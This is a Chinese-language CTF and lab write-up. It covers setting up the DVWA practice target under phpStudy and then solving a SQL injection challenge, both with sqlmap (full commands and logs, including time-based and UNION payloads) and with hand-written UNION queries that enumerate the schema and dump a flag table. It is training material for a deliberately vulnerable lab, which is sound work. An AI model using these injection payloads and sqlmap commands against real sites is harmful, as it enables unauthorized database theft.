# DVWA靶场安装

将下载好的文件解压，然后打开phpstudy的根目录，然后里面有一个文件夹叫`www`

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304192159450.webp)

如图，然后将靶场解压后的文件夹放进这个文件夹即可。

然后再打开phpstudy打开两个服务。

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304192200970.webp)

点击左侧栏的网站。然后选择创建网站

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304192200628.webp)

注意创建网站的时候网站根目录一定要选择到刚刚的www文件夹下拖进去的DVWA-master文件夹，否则无法成功搭建靶场

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304192201114.webp)

保存然后双击打开即可

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304192202102.webp)

用户名：admin

密码：password

# 作业sql注入

打开靶场后查看页面信息，发现有一个名为id的参数是可变的

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304192205718.webp)

我们尝试在url栏中get请求id=2，看看页面是否有回显。

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304192206775.webp)

可以看到页面出现了变化，这里可能存在sql注入点

将url的地址复制下来进入sqlmap跑一下，

url=`http://hackattack.cn:1227/Va41IcUZk47qSxlUmgJuDe681ryyBajc/?id=1`

在sqlmap中使用命令`sqlmap -u "http://hackattack.cn:1227/Va41IcUZk47qSxlUmgJuDe681ryyBajc/?id=1" --tables --purge`可以查看当前网页的所有数据库以及所有数据库里包含的表名

由于跑完的数据库名和表名过多无法以截图展示，这里就以代码块的形式展现出来

```
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:09:41 /2023-04-19/

[10:09:41] [INFO] purging content of directory '/root/.local/share/sqlmap'...
[10:09:41] [INFO] testing connection to the target URL
[10:09:41] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:09:41] [INFO] testing if the target URL content is stable
[10:09:42] [INFO] target URL content is stable
[10:09:42] [INFO] testing if GET parameter 'id' is dynamic
[10:09:42] [WARNING] GET parameter 'id' does not appear to be dynamic
[10:09:42] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[10:09:42] [INFO] testing for SQL injection on GET parameter 'id'
[10:09:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:09:42] [WARNING] reflective value(s) found and filtering out
[10:09:42] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:09:42] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:09:43] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:09:43] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:09:43] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:09:43] [INFO] testing 'Generic inline queries'
[10:09:43] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:09:43] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:09:43] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:09:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:09:54] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]                                                                                                               
[10:10:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'                                                                                                                                                                    
[10:10:51] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found                                                                                       
[10:10:51] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                          
[10:10:51] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')                                                                                                                                                  
[10:10:51] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test               
[10:10:52] [INFO] target URL appears to have 3 columns in query                                                                                                                                                                             
[10:10:52] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable                                                                                                                                           
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 68 HTTP(s) requests:
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 7456 FROM (SELECT(SLEEP(5)))Ycjl) AND 'hSpb'='hSpb

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-9654' UNION ALL SELECT NULL,NULL,CONCAT(0x716a7a7871,0x5463717475496b786a514c484d73524d52477a70687763746a727149496375786443795059526179,0x7162707171)-- -
---
[10:10:52] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
[10:10:53] [INFO] fetching database names
[10:10:53] [INFO] fetching tables for databases: 'user, information_schema, message, mysql, performance_schema, sys, yucctf'
Database: information_schema
[79 tables]
+------------------------------------------------------+
| ADMINISTRABLE_ROLE_AUTHORIZATIONS                    |
| APPLICABLE_ROLES                                     |
| CHARACTER_SETS                                       |
| CHECK_CONSTRAINTS                                    |
| COLLATIONS                                           |
| COLLATION_CHARACTER_SET_APPLICABILITY                |
| COLUMNS                                              |
| COLUMNS_EXTENSIONS                                   |
| COLUMN_PRIVILEGES                                    |
| COLUMN_STATISTICS                                    |
| ENABLED_ROLES                                        |
| ENGINES                                              |
| EVENTS                                               |
| FILES                                                |
| INNODB_BUFFER_PAGE                                   |
| INNODB_BUFFER_PAGE_LRU                               |
| INNODB_BUFFER_POOL_STATS                             |
| INNODB_CACHED_INDEXES                                |
| INNODB_CMP                                           |
| INNODB_CMPMEM                                        |
| INNODB_CMPMEM_RESET                                  |
| INNODB_CMP_PER_INDEX                                 |
| INNODB_CMP_PER_INDEX_RESET                           |
| INNODB_CMP_RESET                                     |
| INNODB_COLUMNS                                       |
| INNODB_DATAFILES                                     |
| INNODB_FIELDS                                        |
| INNODB_FOREIGN                                       |
| INNODB_FOREIGN_COLS                                  |
| INNODB_FT_BEING_DELETED                              |
| INNODB_FT_CONFIG                                     |
| INNODB_FT_DEFAULT_STOPWORD                           |
| INNODB_FT_DELETED                                    |
| INNODB_FT_INDEX_CACHE                                |
| INNODB_FT_INDEX_TABLE                                |
| INNODB_INDEXES                                       |
| INNODB_METRICS                                       |
| INNODB_SESSION_TEMP_TABLESPACES                      |
| INNODB_TABLES                                        |
| INNODB_TABLESPACES                                   |
| INNODB_TABLESPACES_BRIEF                             |
| INNODB_TABLESTATS                                    |
| INNODB_TEMP_TABLE_INFO                               |
| INNODB_TRX                                           |
| INNODB_VIRTUAL                                       |
| KEYWORDS                                             |
| KEY_COLUMN_USAGE                                     |
| OPTIMIZER_TRACE                                      |
| PARAMETERS                                           |
| PARTITIONS                                           |
| PLUGINS                                              |
| PROCESSLIST                                          |
| PROFILING                                            |
| REFERENTIAL_CONSTRAINTS                              |
| RESOURCE_GROUPS                                      |
| ROLE_COLUMN_GRANTS                                   |
| ROLE_ROUTINE_GRANTS                                  |
| ROLE_TABLE_GRANTS                                    |
| ROUTINES                                             |
| SCHEMATA                                             |
| SCHEMATA_EXTENSIONS                                  |
| SCHEMA_PRIVILEGES                                    |
| STATISTICS                                           |
| ST_GEOMETRY_COLUMNS                                  |
| ST_SPATIAL_REFERENCE_SYSTEMS                         |
| ST_UNITS_OF_MEASURE                                  |
| TABLES                                               |
| TABLESPACES                                          |
| TABLESPACES_EXTENSIONS                               |
| TABLES_EXTENSIONS                                    |
| TABLE_CONSTRAINTS                                    |
| TABLE_CONSTRAINTS_EXTENSIONS                         |
| TABLE_PRIVILEGES                                     |
| TRIGGERS                                             |
| USER_ATTRIBUTES                                      |
| USER_PRIVILEGES                                      |
| VIEWS                                                |
| VIEW_ROUTINE_USAGE                                   |
| VIEW_TABLE_USAGE                                     |
+------------------------------------------------------+

Database: message
[3 tables]
+------------------------------------------------------+
| user                                                 |
| flag                                                 |
| username                                             |
+------------------------------------------------------+

Database: mysql
[37 tables]
+------------------------------------------------------+
| user                                                 |
| columns_priv                                         |
| component                                            |
| db                                                   |
| default_roles                                        |
| engine_cost                                          |
| func                                                 |
| general_log                                          |
| global_grants                                        |
| gtid_executed                                        |
| help_category                                        |
| help_keyword                                         |
| help_relation                                        |
| help_topic                                           |
| innodb_index_stats                                   |
| innodb_table_stats                                   |
| password_history                                     |
| plugin                                               |
| procs_priv                                           |
| proxies_priv                                         |
| replication_asynchronous_connection_failover         |
| replication_asynchronous_connection_failover_managed |
| replication_group_configuration_version              |
| replication_group_member_actions                     |
| role_edges                                           |
| server_cost                                          |
| servers                                              |
| slave_master_info                                    |
| slave_relay_log_info                                 |
| slave_worker_info                                    |
| slow_log                                             |
| tables_priv                                          |
| time_zone                                            |
| time_zone_leap_second                                |
| time_zone_name                                       |
| time_zone_transition                                 |
| time_zone_transition_type                            |
+------------------------------------------------------+

Database: performance_schema
[110 tables]
+------------------------------------------------------+
| accounts                                             |
| binary_log_transaction_compression_stats             |
| cond_instances                                       |
| data_lock_waits                                      |
| data_locks                                           |
| error_log                                            |
| events_errors_summary_by_account_by_error            |
| events_errors_summary_by_host_by_error               |
| events_errors_summary_by_thread_by_error             |
| events_errors_summary_by_user_by_error               |
| events_errors_summary_global_by_error                |
| events_stages_current                                |
| events_stages_history                                |
| events_stages_history_long                           |
| events_stages_summary_by_account_by_event_name       |
| events_stages_summary_by_host_by_event_name          |
| events_stages_summary_by_thread_by_event_name        |
| events_stages_summary_by_user_by_event_name          |
| events_stages_summary_global_by_event_name           |
| events_statements_current                            |
| events_statements_histogram_by_digest                |
| events_statements_histogram_global                   |
| events_statements_history                            |
| events_statements_history_long                       |
| events_statements_summary_by_account_by_event_name   |
| events_statements_summary_by_digest                  |
| events_statements_summary_by_host_by_event_name      |
| events_statements_summary_by_program                 |
| events_statements_summary_by_thread_by_event_name    |
| events_statements_summary_by_user_by_event_name      |
| events_statements_summary_global_by_event_name       |
| events_transactions_current                          |
| events_transactions_history                          |
| events_transactions_history_long                     |
| events_transactions_summary_by_account_by_event_name |
| events_transactions_summary_by_host_by_event_name    |
| events_transactions_summary_by_thread_by_event_name  |
| events_transactions_summary_by_user_by_event_name    |
| events_transactions_summary_global_by_event_name     |
| events_waits_current                                 |
| events_waits_history                                 |
| events_waits_history_long                            |
| events_waits_summary_by_account_by_event_name        |
| events_waits_summary_by_host_by_event_name           |
| events_waits_summary_by_instance                     |
| events_waits_summary_by_thread_by_event_name         |
| events_waits_summary_by_user_by_event_name           |
| events_waits_summary_global_by_event_name            |
| file_instances                                       |
| file_summary_by_event_name                           |
| file_summary_by_instance                             |
| global_status                                        |
| global_variables                                     |
| host_cache                                           |
| hosts                                                |
| keyring_component_status                             |
| keyring_keys                                         |
| log_status                                           |
| memory_summary_by_account_by_event_name              |
| memory_summary_by_host_by_event_name                 |
| memory_summary_by_thread_by_event_name               |
| memory_summary_by_user_by_event_name                 |
| memory_summary_global_by_event_name                  |
| metadata_locks                                       |
| mutex_instances                                      |
| objects_summary_global_by_type                       |
| performance_timers                                   |
| persisted_variables                                  |
| prepared_statements_instances                        |
| processlist                                          |
| replication_applier_configuration                    |
| replication_applier_filters                          |
| replication_applier_global_filters                   |
| replication_applier_status                           |
| replication_applier_status_by_coordinator            |
| replication_applier_status_by_worker                 |
| replication_asynchronous_connection_failover         |
| replication_asynchronous_connection_failover_managed |
| replication_connection_configuration                 |
| replication_connection_status                        |
| replication_group_member_stats                       |
| replication_group_members                            |
| rwlock_instances                                     |
| session_account_connect_attrs                        |
| session_connect_attrs                                |
| session_status                                       |
| session_variables                                    |
| setup_actors                                         |
| setup_consumers                                      |
| setup_instruments                                    |
| setup_objects                                        |
| setup_threads                                        |
| socket_instances                                     |
| socket_summary_by_event_name                         |
| socket_summary_by_instance                           |
| status_by_account                                    |
| status_by_host                                       |
| status_by_thread                                     |
| status_by_user                                       |
| table_handles                                        |
| table_io_waits_summary_by_index_usage                |
| table_io_waits_summary_by_table                      |
| table_lock_waits_summary_by_table                    |
| threads                                              |
| tls_channel_status                                   |
| user_defined_functions                               |
| user_variables_by_thread                             |
| users                                                |
| variables_by_thread                                  |
| variables_info                                       |
+------------------------------------------------------+

Database: sys
[101 tables]
+------------------------------------------------------+
| session                                              |
| version                                              |
| host_summary                                         |
| host_summary_by_file_io                              |
| host_summary_by_file_io_type                         |
| host_summary_by_stages                               |
| host_summary_by_statement_latency                    |
| host_summary_by_statement_type                       |
| innodb_buffer_stats_by_schema                        |
| innodb_buffer_stats_by_table                         |
| innodb_lock_waits                                    |
| io_by_thread_by_latency                              |
| io_global_by_file_by_bytes                           |
| io_global_by_file_by_latency                         |
| io_global_by_wait_by_bytes                           |
| io_global_by_wait_by_latency                         |
| latest_file_io                                       |
| memory_by_host_by_current_bytes                      |
| memory_by_thread_by_current_bytes                    |
| memory_by_user_by_current_bytes                      |
| memory_global_by_current_bytes                       |
| memory_global_total                                  |
| metrics                                              |
| processlist                                          |
| ps_check_lost_instrumentation                        |
| schema_auto_increment_columns                        |
| schema_index_statistics                              |
| schema_object_overview                               |
| schema_redundant_indexes                             |
| schema_table_lock_waits                              |
| schema_table_statistics                              |
| schema_table_statistics_with_buffer                  |
| schema_tables_with_full_table_scans                  |
| schema_unused_indexes                                |
| session_ssl_status                                   |
| statement_analysis                                   |
| statements_with_errors_or_warnings                   |
| statements_with_full_table_scans                     |
| statements_with_runtimes_in_95th_percentile          |
| statements_with_sorting                              |
| statements_with_temp_tables                          |
| sys_config                                           |
| user_summary                                         |
| user_summary_by_file_io                              |
| user_summary_by_file_io_type                         |
| user_summary_by_stages                               |
| user_summary_by_statement_latency                    |
| user_summary_by_statement_type                       |
| wait_classes_global_by_avg_latency                   |
| wait_classes_global_by_latency                       |
| waits_by_host_by_latency                             |
| waits_by_user_by_latency                             |
| waits_global_by_latency                              |
| x$host_summary                                       |
| x$host_summary_by_file_io                            |
| x$host_summary_by_file_io_type                       |
| x$host_summary_by_stages                             |
| x$host_summary_by_statement_latency                  |
| x$host_summary_by_statement_type                     |
| x$innodb_buffer_stats_by_schema                      |
| x$innodb_buffer_stats_by_table                       |
| x$innodb_lock_waits                                  |
| x$io_by_thread_by_latency                            |
| x$io_global_by_file_by_bytes                         |
| x$io_global_by_file_by_latency                       |
| x$io_global_by_wait_by_bytes                         |
| x$io_global_by_wait_by_latency                       |
| x$latest_file_io                                     |
| x$memory_by_host_by_current_bytes                    |
| x$memory_by_thread_by_current_bytes                  |
| x$memory_by_user_by_current_bytes                    |
| x$memory_global_by_current_bytes                     |
| x$memory_global_total                                |
| x$processlist                                        |
| x$ps_digest_95th_percentile_by_avg_us                |
| x$ps_digest_avg_latency_distribution                 |
| x$ps_schema_table_statistics_io                      |
| x$schema_flattened_keys                              |
| x$schema_index_statistics                            |
| x$schema_table_lock_waits                            |
| x$schema_table_statistics                            |
| x$schema_table_statistics_with_buffer                |
| x$schema_tables_with_full_table_scans                |
| x$session                                            |
| x$statement_analysis                                 |
| x$statements_with_errors_or_warnings                 |
| x$statements_with_full_table_scans                   |
| x$statements_with_runtimes_in_95th_percentile        |
| x$statements_with_sorting                            |
| x$statements_with_temp_tables                        |
| x$user_summary                                       |
| x$user_summary_by_file_io                            |
| x$user_summary_by_file_io_type                       |
| x$user_summary_by_stages                             |
| x$user_summary_by_statement_latency                  |
| x$user_summary_by_statement_type                     |
| x$wait_classes_global_by_avg_latency                 |
| x$wait_classes_global_by_latency                     |
| x$waits_by_host_by_latency                           |
| x$waits_by_user_by_latency                           |
| x$waits_global_by_latency                            |
+------------------------------------------------------+

Database: user
[2 tables]
+------------------------------------------------------+
| user                                                 |
| token                                                |
+------------------------------------------------------+

Database: yucctf
[1 table]
+------------------------------------------------------+
| user                                                 |
+------------------------------------------------------+

[10:10:53] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 27 times
[10:10:53] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/hackattack.cn'

[*] ending @ 10:10:53 /2023-04-19/
```

接下来就是查看所有数据库里的表名了，看看哪个看起来是有藏有flag的

首先sqlmap已经告诉我们这个是一个MySQL数据库

一般情况下MySQL有一个自带的库名叫`information_schema`这里一般都是自带的东西，很少会将数据藏在这里，所以可以偷个懒，这里看一边过就行了

接下来我们就慢慢的看看每个数据库里的表名是什么，有没有一些比较明显可疑的表名

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304192227328.webp)

随后我们在一个名叫`message`的数据库里发现一个叫做flag的表。

这一眼丁真，肯定有鬼

马上锁定这个表看看里面有什么东西

使用命令`sqlmap -u "http://hackattack.cn:1227/Va41IcUZk47qSxlUmgJuDe681ryyBajc/?id=1" --columns -T flag -D message`可以查看message这个库里的flag表里有什么字段

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304192229539.webp)

这里也看到flag的数据类型是字符串类型，答案已经八九不离十了

再使用命令查看这个字段里的数据`sqlmap -u "http://hackattack.cn:1227/Va41IcUZk47qSxlUmgJuDe681ryyBajc/?id=1" --columns -T flag -D message --dump`

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304192231951.webp)

`flag{a1a8887793acfc199182a649e905daab}`

可以看到这里已经得到flag了，不过这个flag看起来貌似是md5加密后的

这里使用在线[MD5解密](https://www.somd5.com/)平台解密看看

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304192236734.webp)

然后成功解出密文，不过是chen一下子突然不自信了...(汗颜)

## 手注解法

打开页面后发现能交互的只有url栏，而可变参数为id=1

尝试一下改变id的值

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200816101.webp)

页面发生变化，再看看他是怎么闭合语句的

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200817314.webp)

可以看到，他不是双引号闭合，因为双引号也被当成字符串传递进去了

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200817782.webp)

但是当以'结尾时发现语句闭合，页面无回显，证明单引号闭合

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200819680.webp)

按照这个规律写了一个时间延时，发现语句生效，证明我们输入进去的数据被当成代码执行了说明这里一定存在SQL注入点

现在来以这个为模板查询一下字段

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200821659.webp)

该数据库一共有三个字段因为当order by 4 时页面没有了回显，估计是报错被屏蔽了

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200822008.webp)

现在已经知道了字段数，接下来是查看库名使用命令`/?id=2' and 1=2 union select 1,database(),3 -- dwada`

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200824443.webp)

得到这个数据所在的库名为message。再看看里面有什么表

`?id=2' and 1=2 union select 1,table_name,3 from information_schema.tables where table_schema='message' -- dawdw`

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200827249.webp)

这个库下有一个叫flag的表

使用limit函数发现这个表下一共有三个表，分别是flag、user、username

用法`?id=2' and 1=2 union select 1,table_name,3 from information_schema.tables where table_schema='message' limit 0,1  -- dawdw`

通过不断改变0,1 1,1 2,1 就可以知道每个表的名字，当到3,1时页面没了回显

接下来就看看flag表里有什么字段，因为他看起来比user和username更加可能存在flag

命令`?id=2' and 1=2 union select 1,column_name,3 from information_schema.columns where tabels_chema='message' and table_name='flag' limit 0,1 -- dawd`

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200837920.webp)

发现这个flag表下一共有两个字段分别是flag、id，那我们就继续查看flag表里的flag字段

`?id=2' and 1=2 union select 1,flag,3 from flag -- dawd`

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200840482.webp)

成功拿下flag，不过这个flag是被md5加密后的，需要拿去解密一下

`flag{a1a8887793acfc199182a649e905daab}`

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200841047.webp)

flag里的东西解密后就是chen所以答案是

`flag{chen}`




